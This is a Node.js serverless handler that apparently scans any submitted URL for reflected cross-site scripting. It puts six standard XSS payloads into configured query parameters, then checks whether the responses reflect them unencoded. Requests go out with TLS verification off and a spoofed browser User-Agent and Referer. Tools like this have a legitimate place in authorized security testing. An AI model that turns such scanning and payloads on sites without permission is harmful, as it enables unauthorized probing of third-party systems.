const axios = require('axios');
const https = require('https');
const rules = require('../../rules.json');

const axiosInstance = axios.create({
    httpsAgent: new https.Agent({ rejectUnauthorized: false }),
    timeout: 8000,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://www.google.com/'
    }
});

const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    'javascript:alert(1)'
];

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { url } = req.body;
    if (!url) return res.status(400).json({ error: 'Missing url' });

    let targetUrl = url;
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

    for (const param of rules.xssParams) {
        for (const payload of xssPayloads) {
            const testUrl = new URL(targetUrl);
            testUrl.searchParams.set(param, payload);
            try {
                const resData = await axiosInstance.get(testUrl.href);
                // 检查 payload 是否未被编码直接反射
                if (resData.data.includes(payload) && !resData.data.includes('&lt;script&gt;')) {
                    return res.json({ vulnerable: true, param, url: testUrl.href, payload });
                }
                // 检查是否在属性中反射（如 value="payload"）
                const attrPattern = new RegExp(`${param}=["'][^"']*${escapeRegex(payload)}[^"']*["']`);
                if (attrPattern.test(resData.data)) {
                    return res.json({ vulnerable: true, param, url: testUrl.href, payload, note: 'Reflected in attribute' });
                }
            } catch (e) {}
        }
    }
    res.json({ vulnerable: false });
};

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
